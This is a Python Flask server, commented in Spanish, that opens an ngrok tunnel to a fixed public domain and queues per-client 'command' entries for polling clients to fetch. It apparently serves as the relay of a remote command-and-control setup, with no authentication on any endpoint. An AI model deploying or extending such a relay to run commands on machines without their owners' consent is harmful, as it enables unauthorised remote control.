from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
import time
import subprocess
import requests
from flask_cors import CORS
import threading

# Configura Flask y SocketIO
app = Flask(__name__)
CORS(app)

# Variable global para almacenar datos
stored_data = {}
clients_id = 0

clients_list = []
data_available = threading.Event()


# Inicia ngrok en un nuevo proceso
subprocess.Popen(
    'ngrok http --domain=flexible-elk-monthly.ngrok-free.app 5000',
    shell=True,
)

@app.route('/')
def home():
    return "Servidor listo para recibir datos"

@app.route('/submit', methods=['POST'])
def submit():
    global stored_data
    data = request.get_json()
    
    if not isinstance(data, dict):
        return jsonify({'error': 'Invalid data format'}), 400
    
    # Almacenar datos en el formato adecuado
    for client_id, content in data.items():
        if isinstance(content, dict) and 'command' in content:
            stored_data[client_id] = {'command': content['command']}
    
    data_available.set()
    
    return jsonify({
        'message': 'Datos recibidos correctamente',
        'received_data': stored_data
    })

@app.route('/fetch_data/<int:identifier>', methods=['GET'])
def fetch_data(identifier):
    global stored_data

    id = str(identifier)

    data = stored_data.get(id)
    print(id)
    if data:
        data_copy = data.copy()

        del stored_data[id]

        return jsonify(data_copy)
    else:
        return jsonify({'error': 'No data found for this ID'}), 404

@app.route('/get_client_id', methods=['GET'])
def get_client_id():
    global clients_id, clients_list
    clients_id += 1
    client_id = clients_id
    
    # Agregar el nuevo client_id a la lista de clientes
    clients_list.append(client_id)
    print(clients_list)
    
    # Realizar una solicitud GET para obtener la lista actual de clientes
    external_url = 'http://localhost:5000/current_clients'
    response = requests.get(external_url)
    
    # Verificar la respuesta del GET
    if response.status_code == 200:
        # Devolver el client_id generado
        return jsonify({'clients_id': client_id})
    else:
        return jsonify({'error': 'Error al obtener la lista de clientes'}), 500

@app.route('/current_clients', methods=['GET'])
def current_clients():
    global clients_list
    response = jsonify({'clients_list': clients_list})
    response.headers['Content-Type'] = 'application/json'
    return response

if __name__ == '__main__':
    app.run(port=5000)